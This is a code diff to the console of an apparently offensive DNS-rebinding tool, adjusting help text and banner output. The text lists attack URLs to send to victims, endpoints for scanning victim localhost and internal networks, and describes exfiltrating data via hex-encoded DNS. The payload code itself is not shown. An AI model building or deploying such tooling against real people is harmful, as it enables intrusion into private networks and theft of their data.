@@ -1308,6 +1308,12 @@ class CommandProtocol(LineReceiver):
         self.send('')
     
     def cmd_payload(self):
+        if not config.enable_http:
+            self.send('\n⚠️  HTTP payload server is disabled.')
+            self.send('    Restart with --http-enable to use browser attack payloads.')
+            self.send('')
+            return
+            
         http_port = config.http_port
         self.send(f'\n🎯 Browser Attack Payloads')
         self.send('═' * 60)
@@ -1318,17 +1324,17 @@ class CommandProtocol(LineReceiver):
         self.send(f'    /portscan  - Scan ports on victim localhost')
         self.send(f'    /netscan   - Scan internal network')
         self.send('')
-        self.send('  Example attack URLs (send to victim):')
-        self.send(f'    http://attack.{config.domain}:{http_port}/single?port=8080')
-        self.send(f'    http://attack.{config.domain}:{http_port}/portscan?ports=80,3000,8080')
-        self.send(f'    http://attack.{config.domain}:{http_port}/netscan?port=80')
+        self.send('  Attack URLs (send to victim):')
+        self.send(f'    http://attack.{config.domain}:{http_port}/single')
+        self.send(f'    http://attack.{config.domain}:{http_port}/single?path=/admin')
+        self.send(f'    http://attack.{config.domain}:{http_port}/portscan')
         self.send('')
         self.send('  How it works:')
         self.send('    1. Victim visits URL → loads from YOUR server')
         self.send('    2. Page waits for DNS TTL to expire')
         self.send('    3. JS fetches "same origin" → DNS now returns rebind IP')
-        self.send('    4. Browser fetches from victim localhost/LAN!')
-        self.send('    5. Data exfiltrated via DNS to your exfil domain')
+        self.send('    4. Browser fetches from victim localhost!')
+        self.send('    5. Data exfiltrated via DNS (hex encoded)')
         self.send('')
     
     def cmd_quit(self):
@@ -1441,11 +1447,12 @@ def print_banner():
         print(f'  HTTP payloads:   (disabled)  (enable with --http-enable)')
     print(f'  Strategy:        {config.strategy.describe()}')
     print(f'  Exfil domain:    *.{config.exfil_prefix}.{config.domain}')
+    print()
     if config.enable_http:
-        print()
-        print(f'  \033[93m📋 Payload URL (stable host):\033[0m  http://static.{config.domain}:{config.http_port}/single')
-        print(f'  \033[93m📋 Rebind namespace:\033[0m         http://rXXXX.{config.rb_zone}:{config.http_port}/ (auto)')
-        print()
+        print(f'  \033[93m📋 Attack URL:\033[0m    http://attack.{config.domain}:{config.http_port}/single')
+    else:
+        print(f'  \033[93m📋 Attack URL:\033[0m    (HTTP payloads disabled - use --http-enable)')
+    print()
     print(f'  Main log:        {config.logger.main_log}')
     print(f'  JSON log:        {config.logger.json_log}')
     print(f'  Exfil log:       {config.logger.exfil_log}')
